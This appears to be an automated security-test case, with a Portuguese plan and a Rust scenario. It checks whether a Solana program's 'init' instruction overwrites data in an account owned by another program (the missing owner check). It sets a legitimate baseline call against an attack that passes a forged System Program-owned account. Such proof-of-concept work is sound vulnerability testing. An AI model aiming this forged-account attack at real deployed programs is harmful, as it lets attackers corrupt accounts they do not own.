{
  "plan": "O programa `init` (Pinocchio) escreve em `accounts[0]` sem verificar o owner. O baseline usa uma conta `config` cujo owner e o proprio programa-alvo (uso legitimo). O ataque repete a mesma instrucao, mas troca `accounts[0]` por uma conta cujo owner e outro programa (ex.: System Program), tentando fazer o programa sobrescrever dados de uma conta que nao lhe pertence. O efeito mede se a conta forjada teve seus dados alterados (bytes 0..8 iguais a [1,2,3,4,5,6,7,8]) apos o ataque, o que o uso legitimo nao produziria na conta do atacante.",
  "scenario": "let authority = Pubkey::new_unique();

// Conta config legitima: dono e o programa-alvo
let config_legit = account(&env.program_id, &[0u8; 64], None);
let authority_acc = wallet(1_000_000_000);

let ix_legit = env.raw_ix(&[0u8], &[
    AccountMeta::new(config_legit_key, false),
    AccountMeta::new_readonly(authority, false),
]);

let r_base = env.baseline("init legitimo", &ix_legit, &[
    (config_legit_key, config_legit),
    (authority, authority_acc),
]);

// Conta forjada: dono e o System Program (nao o programa-alvo)
let forged_key = Pubkey::new_unique();
let forged = account(&solana_sdk::system_program::id(), &[0u8; 64], None);
let authority_acc2 = wallet(1_000_000_000);

let ix_attack = env.raw_ix(&[0u8], &[
    AccountMeta::new(forged_key, false),
    AccountMeta::new_readonly(authority, false),
]);

let r = env.attack("init com conta de outro dono", &ix_attack, &[
    (forged_key, forged),
    (authority, authority_acc2),
]);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &forged_key).data();
    env.effect(
        "conta forjada (owner != program_id) teve dados sobrescritos",
        data.len() >= 8 && data[0..8] == [1, 2, 3, 4, 5, 6, 7, 8],
    );
}"
}

